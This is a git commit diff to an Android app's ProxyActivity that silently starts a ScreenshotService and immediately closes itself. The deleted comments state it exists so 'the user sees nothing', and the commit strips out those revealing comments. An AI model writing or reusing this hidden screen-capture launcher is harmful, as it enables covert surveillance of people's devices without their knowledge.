2a30f67ff69269328df558a115e5c2db4b5da1bd
Jasim9085 <juahmed9085@gmail.com>
2025-08-15 21:29:08 +0530

    Update ProxyActivity.java

--- app/src/main/java/com/chimera/ProxyActivity.java
+++ app/src/main/java/com/chimera/ProxyActivity.java
@@ -9,13 +9,10 @@ public class ProxyActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        // This is the only purpose of this activity:
-        // to provide a legitimate foreground context to start the service.
+        
         Intent serviceIntent = new Intent(this, ScreenshotService.class);
         ContextCompat.startForegroundService(this, serviceIntent);
         
-        // Immediately finish so the user sees nothing.
         finishAndRemoveTask();
     }
 }
